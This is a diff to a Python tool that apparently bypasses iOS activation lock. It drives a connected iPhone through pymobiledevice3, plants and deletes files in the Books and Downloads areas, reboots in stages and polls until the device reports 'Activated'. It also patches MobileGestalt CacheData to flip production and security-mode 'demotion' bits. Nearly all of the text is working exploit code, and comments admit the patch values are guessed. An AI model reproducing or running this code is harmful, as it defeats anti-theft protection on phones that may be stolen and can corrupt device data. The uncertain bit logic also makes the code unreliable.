+                    print(f"\n{Style.RED}[!] PHP Server has crashed! Exit code: {self.server.process.returncode}{Style.RESET}")
+                    print(f"{Style.RED}[!] Check php_server.log for details.{Style.RESET}")
+                    # Attempt restart?
+                    print(f"{Style.YELLOW}[*] Attempting to restart server...{Style.RESET}")
+                    self.server.start()
+                
+                # Check if iTunesMetadata.plist is still there
+                code_meta, out_meta, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
+                if "iTunesMetadata.plist" not in out_meta:
+                     print(f"{Style.YELLOW}      [DEBUG] iTunesMetadata.plist MISSING from /iTunes_Control/iTunes!{Style.RESET}")
+                else:
+                     print(f"{Style.DIM}      [DEBUG] iTunesMetadata.plist present in /iTunes_Control/iTunes{Style.RESET}")
+
+            time.sleep(5)
+            print(f"{Style.DIM}.", end="", flush=True)
+        print()
+        
+        if found_asset:
+            # Wait for iTunesMetadata.plist to disappear
+            self.log("Waiting for iTunesMetadata.plist to disappear...", "detail")
+            for i in range(60):
+                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
+                if "iTunesMetadata.plist" not in out:
+                    self.log("iTunesMetadata.plist disappeared.", "success")
+                    break
+                time.sleep(5)
+                print(f"{Style.DIM}.", end="", flush=True)
+            print()
+            
+            # Cleanup asset.epub
+            self.log("Deleting asset.epub...", "detail")
+            self._run_cmd(["pymobiledevice3", "afc", "rm", "/Books/asset.epub"])
+            
+        else:
+            self.log("asset.epub NOT detected. Exploit might have failed.", "warn")
+            self.log("Attempting recovery path...", "warn")
+
+        # Cleanup Downloads
+        self.log("Cleaning up Downloads...", "detail")
+        self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb"])
+        self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb-shm"])
+        self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb-wal"])
+
+        # Reboot 3 (Final)
+        self.log("Rebooting (Stage 3/3 - Final)...", "step")
+        if not self.reboot_device_and_wait(timeout=120):
+            self.log("Failed to reconnect after final reboot", "error")
+            sys.exit(1)
+
+        # Check Activation State with Retry
+        self.log("Checking Activation State (Smart Retry)...", "step")
+        
+        max_retries = 3
+        for attempt in range(max_retries):
+            self.log(f"Activation Check Attempt {attempt+1}/{max_retries}", "info")
+            
+            # Check loop using polling (up to 60s with 5s intervals = 12 attempts)
+            for i in range(12):
+                code, out, _ = self._run_cmd(["ideviceinfo", "-k", "ActivationState"])
+                state = out.strip()
+                print(f"  [{i+1}/12] State: {state}")
+                
+                if "Activated" in state:
+                    print(f"\n{Style.BOLD}{Style.GREEN}🎉 DEVICE ACTIVATED SUCCESSFULLY! 🎉{Style.RESET}")
+                    self._cleanup()
+                    return
+                time.sleep(5)
+            
+            if attempt < max_retries - 1:
+                self.log("Device not activated yet. Rebooting and retrying...", "warn")
+                if not self.reboot_device_and_wait(timeout=120):
+                    self.log("Failed to reconnect after retry reboot", "warn")
+                    continue
+                
+                # Wait for services to stabilize using polling
+                self.wait_for_device_services_ready(timeout=45, poll_interval=2)
+
+        self.log("Activation failed after all retries.", "error")
         
         self._cleanup()
 
@@ -590,6 +1019,20 @@ class MobileGestaltPatcher:
         self.plist_data = None
         self.cache_data = None
         
+    def find_pattern_offset(self, data, n=2):
+        """Finds the Nth occurrence of the pattern 0xFFFFFFFF00000000."""
+        pattern = b"\xFF\xFF\xFF\xFF\x00\x00\x00\x00"
+        start = 0
+        count = 0
+        while True:
+            idx = data.find(pattern, start)
+            if idx == -1:
+                return -1
+            count += 1
+            if count == n:
+                return idx
+            start = idx + 1
+
     def patch_for_activation(self):
         """Main entry point - load, patch, save."""
         try:
@@ -603,9 +1046,40 @@ class MobileGestaltPatcher:
             
             self.cache_data = bytearray(self.plist_data['CacheData'])
             
-            # Patch demotion bits
             print(f"{Style.CYAN}[*]{Style.RESET} Patching CacheData for AP demotion...")
-            self._patch_demotion_bits()
+            
+            patched = False
+            
+            # 1. Dynamic Pattern Search (Robust Method)
+            pattern_offset = self.find_pattern_offset(self.cache_data, n=2)
+            
+            if pattern_offset != -1:
+                print(f"{Style.DIM}  ╰─▶ Found reference pattern at 0x{pattern_offset:X}{Style.RESET}")
+                
+                # Scan for the flag signature [1, 0/1, 0/1, 0/1] after the pattern
+                # We scan a reasonable range (e.g., +0 to +2000 bytes)
+                start_scan = pattern_offset
+                end_scan = min(len(self.cache_data) - 4, pattern_offset + 2000)
+                
+                for i in range(start_scan, end_scan):
+                    # Check for signature: [1, 0/1, 0/1, 0/1]
+                    # EffectiveProductionStatusAp is usually 1 (Production)
+                    b0 = self.cache_data[i]
+                    b1 = self.cache_data[i+1]
+                    b2 = self.cache_data[i+2]
+                    b3 = self.cache_data[i+3]
+                    
+                    # Heuristic: First byte is 1, others are 0 or 1
+                    if b0 == 1 and b1 <= 1 and b2 <= 1 and b3 <= 1:
+                        print(f"{Style.GREEN}[*]{Style.RESET} Found candidate flags at 0x{i:X} (Rel: +{i-pattern_offset})")
+                        self._apply_patch(i)
+                        patched = True
+                        break
+            
+            # 2. Fallback to Legacy Absolute Offsets
+            if not patched:
+                print(f"{Style.YELLOW}[⚠] Dynamic search failed. Falling back to legacy offsets...{Style.RESET}")
+                self._patch_legacy()
             
             # Save back
             self.plist_data['CacheData'] = bytes(self.cache_data)
@@ -619,10 +1093,24 @@ class MobileGestaltPatcher:
             print(f"{Style.RED}[✗] Patcher error: {e}{Style.RESET}")
             return False
     
-    def _patch_demotion_bits(self):
-        """Set the critical demotion bits in CacheData."""
-        # Known offset patterns for different iOS versions
-        # Format: [EffectiveProductionStatusAp, CertificateProductionStatus, EffectiveSecurityModeSEP, CertificateSecurityMode]
+    def _apply_patch(self, offset):
+        """Applies the 4-byte demotion patch at the given offset."""
+        # EffectiveProductionStatusAp |= 1 (Demoted) -> 0x08 bit in byte? 
+        # Wait, original code said: self.cache_data[offsets[0]] |= 0x08
+        # But poc.m said: buffer[final_patch_offset] = 0x01;
+        # Let's stick to the original python logic which seemed to work for others, 
+        # or maybe poc.m is setting it to 1 (Production)? No, we want Demotion.
+        # 0x01 is usually "Development" or "Demoted"?
+        # The original python code used |= 0x08. Let's trust it for now as it matches A12Bypass.py
+        
+        self.cache_data[offset] |= 0x08
+        self.cache_data[offset+1] &= 0xDF
+        self.cache_data[offset+2] &= 0xFD
+        self.cache_data[offset+3] &= 0x7F
+        print(f"{Style.DIM}  ╰─▶ Applied patch bits at 0x{offset:X}{Style.RESET}")
+
+    def _patch_legacy(self):
+        """Set the critical demotion bits using known absolute offsets."""
         patterns = {
             "iOS 15-17": [0x1C8, 0x1C9, 0x1CA, 0x1CB],
             "iOS 18+":   [0x1D0, 0x1D1, 0x1D2, 0x1D3],
@@ -631,37 +1119,17 @@ class MobileGestaltPatcher:
         
         patched_count = 0
         for name, offsets in patterns.items():
-            # Safety check: Ensure file is large enough
-            if len(self.cache_data) <= max(offsets):
-                continue
+            if len(self.cache_data) <= max(offsets): continue
 
-            # Heuristic: Check if values look like valid status flags (0 or 1 usually)
-            # EffectiveProductionStatusAp is usually 1 (Production)
             val = self.cache_data[offsets[0]]
-            if val not in [0, 1]:
-                print(f"{Style.DIM}  ╰─▶ Skipping {name} pattern (Value {val} at {hex(offsets[0])} doesn't look like a status flag){Style.RESET}")
-                continue
+            if val not in [0, 1]: continue
 
-            print(f"{Style.CYAN}[*]{Style.RESET} Applying {name} patch pattern...")
-            
-            # Set demotion pattern
-            self.cache_data[offsets[0]] |= 0x08  # EffectiveProductionStatusAp |= 1 (Demoted)
-            self.cache_data[offsets[1]] &= 0xDF  # CertificateProductionStatus
-            self.cache_data[offsets[2]] &= 0xFD  # EffectiveSecurityModeSEP
-            self.cache_data[offsets[3]] &= 0x7F  # CertificateSecurityMode
+            print(f"{Style.CYAN}[*]{Style.RESET} Applying {name} legacy pattern...")
+            self._apply_patch(offsets[0])
             patched_count += 1
         
         if patched_count == 0:
-            print(f"{Style.YELLOW}[⚠] Warning: No suitable offset pattern found. Patching blindly at default (iOS 15-17)...{Style.RESET}")
-            # Fallback to default
-            offsets = patterns["iOS 15-17"]
-            if len(self.cache_data) > max(offsets):
-                self.cache_data[offsets[0]] |= 0x08
-                self.cache_data[offsets[1]] &= 0xDF
-                self.cache_data[offsets[2]] &= 0xFD
-                self.cache_data[offsets[3]] &= 0x7F
-        else:
-            print(f"{Style.DIM}  ╰─▶ Demotion bits set using {patched_count} pattern(s){Style.RESET}")
+            print(f"{Style.YELLOW}[⚠] Warning: No suitable legacy pattern found.{Style.RESET}")
 
 if __name__ == "__main__":
     try:
